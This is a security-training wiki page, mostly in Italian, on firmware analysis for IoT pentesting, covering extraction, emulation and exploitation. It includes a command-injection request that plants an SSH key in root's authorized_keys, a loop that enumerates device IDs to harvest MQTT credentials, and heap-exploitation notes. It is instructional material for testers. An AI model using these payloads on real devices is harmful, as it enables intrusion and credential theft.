# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

## **Introduzione**

### Risorse correlate


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Il firmware è un software essenziale che consente ai dispositivi di funzionare correttamente gestendo e facilitando la comunicazione tra i componenti hardware e il software con cui gli utenti interagiscono. È memorizzato in una memoria permanente, garantendo che il dispositivo possa accedere alle istruzioni vitali fin dal momento in cui viene acceso, portando all'avvio del sistema operativo. Esaminare e, potenzialmente, modificare il firmware è un passaggio critico per identificare vulnerabilità di sicurezza.

## **Raccolta informazioni**

**Raccogliere informazioni** è un passaggio iniziale critico per comprendere la composizione di un dispositivo e le tecnologie che utilizza. Questo processo comporta la raccolta di dati su:

- L'architettura della CPU e il sistema operativo che esegue
- Specifiche del bootloader
- Layout hardware e datasheet
- Metriche della codebase e posizioni del codice sorgente
- Librerie esterne e tipi di licenza
- Cronologie degli aggiornamenti e certificazioni normative
- Diagrammi architetturali e di flusso
- Valutazioni di sicurezza e vulnerabilità identificate

A questo scopo, gli strumenti di **open-source intelligence (OSINT)** sono preziosi, così come l'analisi di eventuali componenti software open-source disponibili tramite processi di revisione manuali e automatizzati. Strumenti come [Coverity Scan](https://scan.coverity.com) e [Semmle’s LGTM](https://lgtm.com/#explore) offrono static analysis gratuita che può essere sfruttata per individuare potenziali problemi.

## **Acquisizione del Firmware**

Ottenere il firmware può essere affrontato in vari modi, ciascuno con il proprio livello di complessità:

- **Direttamente** dalla fonte (sviluppatori, produttori)
- **Compilandolo** seguendo le istruzioni fornite
- **Scaricandolo** dai siti di supporto ufficiali
- Utilizzando query **Google dork** per trovare file firmware ospitati
- Accedendo direttamente allo **cloud storage**, con strumenti come [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Intercettando gli **aggiornamenti** tramite tecniche man-in-the-middle
- **Estrarre** dal dispositivo tramite connessioni come **UART**, **JTAG** o **PICit**
- **Sniffing** delle richieste di aggiornamento all'interno della comunicazione del dispositivo
- Identificando e usando endpoint di aggiornamento **hardcoded**
- **Dumping** dal bootloader o dalla rete
- **Rimuovendo e leggendo** il chip di storage, quando tutto il resto fallisce, usando gli strumenti hardware appropriati

### Log solo UART: forzare una root shell tramite U-Boot env in flash

Se UART RX viene ignorato (solo log), puoi comunque forzare una init shell modificando offline il **blob dell'ambiente U-Boot**:

1. Dump della flash SPI con una clip SOIC-8 + programmatore (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Individua la partizione dell'env di U-Boot, modifica `bootargs` per includere `init=/bin/sh`, e **ricalcola il CRC32 dell'env U-Boot** per il blob.
3. Riscrivi solo la partizione env e riavvia; una shell dovrebbe apparire su UART.

Questo è utile su dispositivi embedded dove la shell del bootloader è disabilitata ma la partizione env è scrivibile tramite accesso esterno alla flash.

## Analizzare il firmware

Ora che **hai il firmware**, devi estrarre informazioni su di esso per sapere come trattarlo. Diversi strumenti che puoi usare per questo:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Se non trovi molto con quei tool, controlla l'**entropy** dell'immagine con `binwalk -E <bin>`; se è bassa, allora probabilmente non è encrypted. Se è alta, è probabile che sia encrypted (o compressed in qualche modo).

Inoltre, puoi usare questi tool per estrarre **files embedded inside the firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Oppure [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) per ispezionare il file.

### Getting the Filesystem

Con i precedenti tool commentati come `binwalk -ev <bin>` dovresti essere riuscito a **extract the filesystem**.\
Binwalk di solito lo estrae in una **folder named as the filesystem type**, che di solito è una delle seguenti: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Manual Filesystem Extraction

A volte binwalk **non avrà il magic byte del filesystem nelle sue signatures**. In questi casi, usa binwalk per **find the offset of the filesystem** e carve the compressed filesystem dal binary e **manually extract** il filesystem in base al suo tipo usando i passaggi qui sotto.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Esegui il seguente **dd command** per estrarre il filesystem Squashfs.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
In alternativa, si potrebbe eseguire anche il seguente comando.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Per squashfs (usato nell'esempio sopra)

`$ unsquashfs dir.squashfs`

I file saranno poi nella directory "`squashfs-root`".

- File di archivio CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Per filesystem jffs2

`$ jefferson rootfsfile.jffs2`

- Per filesystem ubifs con NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analizzando Firmware

Una volta ottenuto il firmware, è essenziale analizzarlo per comprenderne la struttura e le potenziali vulnerabilità. Questo processo comporta l'utilizzo di vari tool per analizzare ed estrarre dati utili dall'immagine del firmware.

### Strumenti di analisi iniziale

Viene fornito un insieme di comandi per l'ispezione iniziale del file binario (indicato come `<bin>`). Questi comandi aiutano a identificare i tipi di file, estrarre stringhe, analizzare i dati binari e ottenere dettagli sulla partizione e sul filesystem:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Per valutare lo stato di crittografia dell'immagine, si controlla l'**entropy** con `binwalk -E <bin>`. Un'entropy bassa suggerisce l'assenza di crittografia, mentre un'entropy alta indica una possibile crittografia o compressione.

Per estrarre **embedded files**, sono consigliati strumenti e risorse come la documentazione **file-data-carving-recovery-tools** e **binvis.io** per ispezionare i file.

### Estrazione del Filesystem

Usando `binwalk -ev <bin>`, in genere si può estrarre il filesystem, spesso in una directory nominata in base al tipo di filesystem (ad es. squashfs, ubifs). Tuttavia, quando **binwalk** non riesce a riconoscere il tipo di filesystem a causa di magic bytes mancanti, è necessaria un'estrazione manuale. Questa prevede l'uso di `binwalk` per individuare l'offset del filesystem, seguito dal comando `dd` per estrarre il filesystem:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Successivamente, a seconda del tipo di filesystem (ad es. squashfs, cpio, jffs2, ubifs), vengono usati comandi diversi per estrarre manualmente il contenuto.

### Analisi del Filesystem

Con il filesystem estratto, inizia la ricerca di falle di sicurezza. L’attenzione si concentra su network daemons non sicuri, credenziali hardcoded, API endpoints, funzionalità del server di aggiornamento, codice non compilato, startup scripts e binary compilati per analisi offline.

**Posizioni chiave** e **elementi** da ispezionare includono:

- **etc/shadow** e **etc/passwd** per le credenziali utente
- Certificati e chiavi SSL in **etc/ssl**
- File di configurazione e script per potenziali vulnerabilità
- Binary embedded per ulteriori analisi
- Web server e binary comuni dei dispositivi IoT

Diversi tools aiutano a scoprire informazioni sensibili e vulnerabilità all’interno del filesystem:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) e [**Firmwalker**](https://github.com/craigz28/firmwalker) per la ricerca di informazioni sensibili
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) per un’analisi completa del firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), e [**EMBA**](https://github.com/e-m-b-a/emba) per analisi statica e dinamica

### Controlli di Sicurezza sui Binary Compilati

Sia il codice sorgente sia i binary compilati trovati nel filesystem devono essere esaminati attentamente per individuare vulnerabilità. Tools come **checksec.sh** per i binary Unix e **PESecurity** per i binary Windows aiutano a identificare binary non protetti che potrebbero essere sfruttati.

## Raccolta di cloud config e credenziali MQTT tramite token URL derivati

Molti hub IoT recuperano la propria configurazione per dispositivo da un endpoint cloud che assomiglia a:

- `https://<api-host>/pf/<deviceId>/<token>`

Durante l’analisi del firmware potresti scoprire che `<token>` è derivato localmente dal device ID usando una secret hardcoded, per esempio:

- token = MD5( deviceId || STATIC_KEY ) ed è rappresentato come hex maiuscolo

Questo design permette a chiunque venga a conoscenza di un deviceId e della STATIC_KEY di ricostruire l’URL e scaricare la cloud config, rivelando spesso credenziali MQTT in plaintext e topic prefixes.

Workflow pratico:

1) Estrai il deviceId dai boot log UART

- Collega un adattatore UART a 3.3V (TX/RX/GND) e cattura i log:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Cerca le righe che stampano il pattern dell'URL di cloud config e l'indirizzo del broker, per esempio:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Recupera STATIC_KEY e l'algoritmo del token dal firmware

- Carica i binari in Ghidra/radare2 e cerca il path di configurazione ("/pf/") o l'uso di MD5.
- Conferma l'algoritmo (ad esempio, MD5(deviceId||STATIC_KEY)).
- Deriva il token in Bash e metti il digest in uppercase:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Raccogli le configurazioni cloud e le credenziali MQTT

- Componi l'URL e scarica il JSON con curl; analizza con jq per estrarre i segreti:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Abuse plaintext MQTT and weak topic ACLs (if present)

- Usa le credenziali recuperate per sottoscriversi ai topic di manutenzione e cercare eventi sensibili:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumerate device ID prevedibili (su larga scala, con autorizzazione)

- Molti ecosistemi incorporano byte vendor OUI/product/type seguiti da un suffisso sequenziale.
- Puoi iterare ID candidati, derivare token e recuperare config programmaticamente:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Note
- Ottenere sempre un’autorizzazione esplicita prima di tentare una mass enumeration.
- Preferire emulation o static analysis per recuperare secrets senza modificare l’hardware target quando possibile.


Il processo di emulating firmware abilita **dynamic analysis** sia del funzionamento di un device sia di un singolo program. Questo approccio può incontrare difficoltà con dipendenze hardware o di architettura, ma trasferire il root filesystem o specifici binary a un device con architettura ed endianness corrispondenti, come un Raspberry Pi, o a una virtual machine pre-costruita, può facilitare ulteriori test.

### Emulating Individual Binaries

Per esaminare singoli programmi, identificare l’endianness e l’architettura CPU del program è fondamentale.

#### Example with MIPS Architecture

Per emulare un binary con architettura MIPS, si può usare il comando:
```bash
file ./squashfs-root/bin/busybox
```
E per installare gli strumenti di emulazione necessari:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Per MIPS (big-endian), `qemu-mips` viene usato, mentre per i binari little-endian, `qemu-mipsel` sarebbe la scelta.

#### ARM Architecture Emulation

Per i binari ARM, il processo è simile, con l'emulatore `qemu-arm` utilizzato per l'emulazione.

### Full System Emulation

Strumenti come [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), e altri, facilitano la full firmware emulation, automatizzando il processo e aiutando nella dynamic analysis.

## Dynamic Analysis in Practice

A questo punto, viene usato per l'analisi un ambiente di dispositivo reale o emulato. È essenziale mantenere l'accesso shell al sistema operativo e al filesystem. L'emulazione potrebbe non mimare perfettamente le interazioni hardware, rendendo necessari occasionali riavvii dell'emulazione. L'analisi dovrebbe riesaminare il filesystem, sfruttare le pagine web esposte e i network services, ed esplorare le vulnerabilità del bootloader. I firmware integrity tests sono critici per identificare potenziali backdoor vulnerabilities.

## Runtime Analysis Techniques

La runtime analysis coinvolge l'interazione con un processo o un binario nel suo ambiente operativo, usando strumenti come gdb-multiarch, Frida e Ghidra per impostare breakpoint e identificare vulnerabilità tramite fuzzing e altre tecniche.

Per embedded targets senza un debugger completo, **copia un `gdbserver` staticamente linkato** sul dispositivo e collegati da remoto:
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Zigbee / radio-co-processor message mapping

Sui hub IoT lo stack RF è spesso diviso tra una **radio MCU** e un processo Linux in userland. Un workflow utile è mappare il percorso:

1. **RF frame** nell’aria
2. **controller-side parser** sulla radio MCU
3. **serial/UART text or TLV protocol** inoltrato a Linux (per esempio `/dev/tty*`)
4. **application dispatcher** nel daemon principale
5. **protocol-specific handler / state machine**

Questa architettura crea due target di reversing invece di uno. Se il controller converte frame radio binari in un protocollo testuale come `Group,Command,arg1,arg2,...`, recupera:

- I **message groups** e le dispatch tables
- Quali messaggi possono arrivare dalla **network** rispetto al controller stesso
- Gli esatti campi discriminanti **manufacturer-specific** (per esempio Zigbee `manufacturer_code` e `cluster_command` custom)
- Quali handler sono raggiungibili solo durante **commissioning**, discovery, o fasi di firmware/model download

Per Zigbee in particolare, cattura il pairing traffic e verifica se il target si basa ancora sulla **Link Key** predefinita `ZigBeeAlliance09`. In tal caso, sniffing del commissioning traffic può esporre il **Network Key**. Gli install code di Zigbee 3.0 riducono questa esposizione, quindi annota se il device testato li impone davvero.

### Manufacturer-specific protocol handlers and FSM-gated reachability

I comandi Zigbee/ZCL vendor-specific sono spesso un target migliore dei cluster standardizzati perché alimentano **custom parsing code** e **FSMs** interne con validation meno collaudata.

Workflow pratico:

- Reversa il command dispatcher finché trovi il **vendor-only handler**.
- Recupera le tabelle **FSM state**, **event**, **check**, **action**, e **next-state**.
- Identifica gli **transitional states** che avanzano automaticamente e i rami di retry/error che alla fine resetano o liberano stato controllato dall’attaccante.
- Conferma quali legittime protocol exchanges sono necessarie per mettere il daemon nello stato vulnerabile invece di assumere che l’handler bugged sia sempre raggiungibile.

Per protocolli sensibili al timing, il packet replay da un framework Python può essere troppo lento. Un approccio più affidabile è emulare un device legittimo su hardware reale (per esempio un **nRF52840**) con uno stack di livello vendor, così da esporre i corretti **endpoints**, **attributes**, e timing di commissioning.

### Fragmented-download bug class in embedded daemons

Una classe ricorrente di bug firmware appare nei **fragmented blob/model/configuration downloads**:

1. Il **first fragment** (`offset == 0`) memorizza `ctx->total_size` e alloca `malloc(total_size)`.
2. I fragment successivi validano solo i campi **packet-local** controllati dall’attaccante, come `packet_total_size >= offset + chunk_len`.
3. La copia usa `memcpy(&ctx->buffer[offset], chunk, chunk_len)` senza controllare contro la **original allocated size**.

Questo permette a un attaccante di inviare:

- Un primo fragment valido con una dimensione totale dichiarata **piccola** per forzare una piccola allocazione heap.
- Un fragment successivo con l’**expected offset** ma un `chunk_len` più grande.
- Una dimensione packet-local falsificata che soddisfa i controlli nuovi pur overflowando il buffer originariamente allocato.

Quando il percorso vulnerabile è dietro la commissioning logic, l’exploitation deve includere abbastanza **device emulation** per portare il target nello stato atteso di model-download o blob-download prima di inviare i fragment malformati.

### Protocol-driven `free()` triggers

Nei daemon embedded, il modo più semplice per triggerare heap metadata exploitation spesso non è "aspettare la cleanup" ma **forzare il protocol's own error handling**:

- Invia fragment di follow-up malformati per spingere la FSM in stati di **retry** o **error**.
- Supera la soglia di retry così che il daemon **resets context** e liberi il buffer corrotto.
- Usa questo `free()` prevedibile per triggerare primitive lato allocator prima che il processo crashi per motivi non correlati.

Questo è particolarmente utile contro allocator **musl/uClibc/dlmalloc-like** in embedded Linux, dove corrompere la metadata dei chunk può trasformare la logica unlink/unbin in una write primitive. Un pattern stabile è corrompere un **size field** per reindirizzare il traversal dell’allocator verso **fake chunks staged inside the overflowed buffer**, invece di sovrascrivere subito i veri puntatori dei bin e far crashare il processo.

## Binary Exploitation and Proof-of-Concept

Sviluppare un PoC per vulnerabilità identificate richiede una profonda comprensione dell’architettura target e programmazione in linguaggi a basso livello. Le binary runtime protections nei sistemi embedded sono rare, ma quando presenti, tecniche come Return Oriented Programming (ROP) possono essere necessarie.

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc usa fastbins simili a glibc. Una successiva allocazione grande può triggerare `__malloc_consolidate()`, quindi ogni fake chunk deve superare i controlli (size sensata, `fd = 0`, e chunk circostanti visti come "in use").
- **Non-PIE binaries under ASLR:** se ASLR è abilitato ma il binary principale è **non-PIE**, gli indirizzi `.data/.bss` nel binary sono stabili. Puoi puntare a una regione che già somiglia a un valido heap chunk header per far atterrare una fastbin allocation su una **function pointer table**.
- **Parser-stopping NUL:** quando JSON è parsato, un `\x00` nel payload può fermare il parsing lasciando bytes trailing controllati dall’attaccante per uno stack pivot/ROP chain.
- **Shellcode via `/proc/self/mem`:** una ROP chain che chiama `open("/proc/self/mem")`, `lseek()`, e `write()` può inserire shellcode eseguibile in una mapping nota e saltarci.

## Prepared Operating Systems for Firmware Analysis

Operating systems come [AttifyOS](https://github.com/adi0x90/attifyos) e [EmbedOS](https://github.com/scriptingxss/EmbedOS) forniscono ambienti preconfigurati per firmware security testing, dotati degli strumenti necessari.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS è una distro pensata per aiutarti a eseguire security assessment e pentesting di dispositivi Internet of Things (IoT). Ti fa risparmiare molto tempo fornendo un ambiente preconfigurato con tutti gli strumenti necessari già caricati.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Sistema operativo di embedded security testing basato su Ubuntu 18.04 con strumenti di firmware security testing preinstallati.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Anche quando un vendor implementa controlli di firma crittografica per le immagini firmware, la **version rollback (downgrade) protection è spesso omessa**. Quando il boot- o recovery-loader verifica solo la firma con una public key incorporata ma non confronta la *version* (o un monotonic counter) dell’immagine in flashing, un attaccante può installare legittimamente un **older, vulnerable firmware che mantiene una firma valida** e così reintrodurre vulnerabilità già patchate.

Workflow tipico dell’attacco:

1. **Obtain an older signed image**
* Recuperala dal portale di download pubblico del vendor, CDN o sito di supporto.
* Estrarla da companion mobile/desktop applications (ad es. dentro un Android APK sotto `assets/firmware/`).
* Recuperarla da repository di terze parti come VirusTotal, archivi internet, forum, ecc.
2. **Upload or serve the image to the device** tramite qualsiasi canale di update esposto:
* Web UI, mobile-app API, USB, TFTP, MQTT, ecc.
* Molti dispositivi IoT consumer espongono endpoint HTTP(S) *unauthenticated* che accettano firmware blob codificati in Base64, li decodificano lato server e triggerano recovery/upgrade.
3. Dopo il downgrade, sfrutta una vulnerabilità che è stata patchata nella release più recente (per esempio un command-injection filter aggiunto in seguito).
4. Opzionalmente riflasha l’ultima immagine o disabilita gli update per evitare rilevamento una volta ottenuta la persistence.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
Nel firmware vulnerabile (degradato), il parametro `md5` viene concatenato direttamente in un comando shell senza sanitizzazione, consentendo l’iniezione di comandi arbitrari (qui – abilitando l’accesso root via SSH basato su chiave). Le versioni successive del firmware hanno introdotto un filtro base sui caratteri, ma l’assenza di protezione dal downgrade rende la correzione inutile.

### Estrazione del Firmware dalle Mobile App

Molti vendor includono immagini complete del firmware all’interno delle loro companion mobile application, in modo che l’app possa aggiornare il dispositivo via Bluetooth/Wi-Fi. Questi pacchetti sono comunemente archiviati non criptati nell’APK/APEX sotto percorsi come `assets/fw/` o `res/raw/`. Strumenti come `apktool`, `ghidra`, o persino il semplice `unzip` consentono di estrarre immagini firmate senza toccare l’hardware fisico.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Checklist per valutare la logica di update

* Il trasporto/autenticazione dell'*update endpoint* è adeguatamente protetto (TLS + authentication)?
* Il device confronta **version numbers** o un **monotonic anti-rollback counter** prima del flashing?
* L'immagine viene verificata dentro una secure boot chain (ad es. signature controllate dal codice ROM)?
* Il codice userland esegue ulteriori controlli di sanity (ad es. allowed partition map, model number)?
* I flussi di update *partial* o *backup* riutilizzano la stessa validation logic?

> 💡  Se uno qualsiasi dei punti sopra manca, la piattaforma è probabilmente vulnerabile ad attacchi di rollback.

## Firmware vulnerabili da praticare

Per esercitarti nel trovare vulnerabilità nel firmware, usa i seguenti progetti di firmware vulnerabile come punto di partenza.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Formazione e Cert

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [Make it Blink: Over-the-Air Exploitation of the Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)

{{#include ../../banners/hacktricks-training.md}}
